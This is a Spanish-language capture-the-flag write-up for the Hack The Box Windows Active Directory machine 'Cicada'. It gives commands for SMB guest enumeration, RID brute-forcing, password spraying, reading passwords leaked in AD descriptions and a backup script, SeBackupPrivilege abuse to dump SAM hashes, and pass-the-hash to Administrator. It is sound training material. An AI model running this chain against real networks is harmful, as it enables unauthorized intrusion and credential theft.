# Cicada — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Cicada](https://app.hackthebox.com/machines/Cicada) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Windows (Active Directory) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se realiza un escaneo completo con Nmap para descubrir los servicios activos en la máquina:

```bash
nmap -p- -sCV -T5 10.129.231.149 -oN nmap
```

![Nmap Scan](images/01_nmap.JPG)

Servicios encontrados:

| Puerto | Servicio | Versión |
|---|---|---|
| 53/tcp | domain | Simple DNS Plus |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | ldap | Microsoft Windows AD LDAP (dominio: `cicada.htb`) |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 636/tcp | ssl/ldap | LDAPS |
| 3268/tcp | ldap | Global Catalog |
| 3269/tcp | ssl/ldap | Global Catalog (SSL) |
| 5985/tcp | http | WinRM (WSMan) |

Esta combinación de puertos (53, 88, 135, 389, 445, 3268) es la huella clásica de un **Controlador de Dominio (DC)** de Active Directory: DNS propio (53), autenticación Kerberos (88), RPC (135), LDAP (389/3268) y compartición de ficheros por SMB (445). El puerto **5985** confirma que WinRM está habilitado, lo que significa que con credenciales válidas se puede obtener directamente una sesión remota de PowerShell.

Se añade el hostname `CICADA-DC` al `/etc/hosts` para resolver correctamente el dominio:

![Fichero hosts](images/02_hosts.JPG)

---

## Enumeración SMB — Sesión nula (Null Session)

Primero se prueba sin credenciales, lo cual falla. Probando con el usuario `guest` y contraseña vacía sí se consigue autenticar, pudiendo listar los recursos compartidos:

```bash
crackmapexec smb cicada.htb -u 'guest' -p '' --shares
```

![Shares con sesión nula](images/03_smb_shares_null.JPG)

Recursos encontrados:

| Share | Permisos | Comentario |
|---|---|---|
| ADMIN$ | - | Remote Admin |
| C$ | - | Default share |
| DEV | - | (no accesible con guest) |
| **HR** | READ | *(¡legible!)* |
| IPC$ | READ | Remote IPC |
| NETLOGON | READ | Logon server share |
| SYSVOL | READ | Logon server share |

El share `HR` es legible con la cuenta `guest`, así que se monta y se descarga su contenido:

```bash
smbclient //cicada.htb/HR
```

Dentro se encuentra el fichero `Notice from HR.txt`, un típico documento de bienvenida:

![Notice from HR](images/04_notice_hr.JPG)

```
Dear new hire!
Welcome to Cicada Corp! [...]
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

Esto expone la **contraseña por defecto** que se asigna a los nuevos empleados.

---

## Enumeración de usuarios vía RPC (lookupsid)

Con la sesión nula todavía se puede consultar RPC para hacer fuerza bruta sobre los RIDs (Relative Identifiers) y enumerar el SID de cada cuenta del dominio, incluso sin permisos de lectura en LDAP:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

![Lookupsid — listado completo de SIDs](images/05_lookupsid_sids.JPG)

Se obtiene el SID del dominio (`S-1-5-21-917908876-1423158569-3159038727`) y todas las cuentas/grupos, incluyendo varias entradas `SidTypeUser`: `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious`, `emily.oscars`.

La salida se filtra para quedarse solo con las cuentas de usuario y se guarda en un diccionario:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass \
  | grep 'SidTypeUser' \
  | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > usuarios.txt
```

![Lookupsid — usuarios filtrados](images/06_lookupsid_users.JPG)

---

## Password Spraying

Con una lista de usuarios y una única contraseña filtrada, se realiza un **password spray**: se prueba la misma contraseña una sola vez contra cada cuenta, evitando bloqueos por intentos fallidos.

```bash
crackmapexec smb cicada.htb -u usuarios.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Password Spray](images/07_password_spray.JPG)

Todas las cuentas fallan excepto una:

```
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

`michael.wrightson` nunca cambió la contraseña por defecto de bienvenida.

---

## Pivote de credenciales — Descripciones de usuario en AD

Con una cuenta de dominio válida se puede volver a consultar el listado completo de usuarios, esta vez incluyendo el campo `description`, un texto libre que algunos administradores usan indebidamente para anotar cosas:

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![Descripciones de usuario](images/08_users_desc.JPG)

```
cicada.htb\david.orelious    desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

La contraseña de `david.orelious` quedó anotada en texto plano en el propio campo de descripción de su cuenta.

---

## Enumeración de shares con david.orelious

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![Shares — david.orelious](images/09_shares_david.JPG)

Esta cuenta tiene acceso de lectura al share **DEV**, inaccesible anteriormente con `guest`:

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

Dentro se descarga y se lee `Backup_script.ps1`, un script de backup automatizado en PowerShell:

![Credenciales en el script de backup](images/10_dev_backup_script.JPG)

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

Se encuentran credenciales hardcodeadas en texto plano para `emily.oscars` dentro del script.

---

## Acceso Inicial — WinRM

El puerto 5985 (WinRM) permite abrir directamente una sesión remota de PowerShell con credenciales válidas, de forma similar a SSH en Linux:

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

![Shell Evil-WinRM + flag de usuario](images/11_evilwinrm_emily_userflag.JPG)

Se obtiene una shell como `emily.oscars`, y se lee `user.txt` desde el Escritorio.

---

## Escalada de Privilegios

### Enumeración de privilegios

Se comprueban los privilegios del usuario actual:

```powershell
whoami /priv
```

![Whoami /priv](images/12_whoami_priv.JPG)

```
SeBackupPrivilege             Back up files and directories    Enabled
SeRestorePrivilege            Restore files and directories    Enabled
```

`emily.oscars` tiene habilitado **`SeBackupPrivilege`**, un privilegio de Windows que permite leer cualquier fichero del disco saltándose las ACLs normales, siempre que se abra con la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Esto es suficiente para leer las colmenas de registro SAM y SYSTEM, que almacenan los hashes de contraseñas locales, incluido el de `Administrator`.

### Volcado de la base SAM

Tras copiar localmente las colmenas de registro `SAM` y `SYSTEM`, se parsean con Impacket:

```bash
impacket-secretsdump -sam sam -system system local
```

![Secretsdump — hashes SAM](images/13_secretsdump_sam.JPG)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```

Se recupera el hash NTLM local de la cuenta `Administrator`.

### Pass-the-Hash

Como la autenticación NTLM se basa en un desafío-respuesta, no se necesita la contraseña en texto plano: el hash es suficiente para autenticarse mediante **Pass-the-Hash**:

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

![Evil-WinRM como Administrator (PtH)](images/14_evilwinrm_admin_pth.JPG)

Se obtiene una shell como `Administrator`, y se lee `root.txt` desde el Escritorio:

![Flag de root](images/15_root_flag.JPG)

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Enumeración SMB | Sesión nula (`guest`) → share `HR` legible | `crackmapexec`, `smbclient` |
| Fuga de credenciales | Contraseña por defecto en documento de HR | revisión manual |
| Enumeración de usuarios | Fuerza bruta de RIDs sobre RPC | `impacket-lookupsid` |
| Credencial inicial | Password spraying | `crackmapexec` |
| Pivote de credenciales | Contraseña filtrada en campo `description` de AD | `crackmapexec --users` |
| Pivote de credenciales | Credenciales hardcodeadas en script de backup | `smbclient` |
| Acceso inicial | WinRM | `evil-winrm` |
| Escalada de privilegios | Abuso de `SeBackupPrivilege` → volcado SAM/SYSTEM | `secretsdump` |
| Escalada de privilegios | Pass-the-Hash | `evil-winrm` |
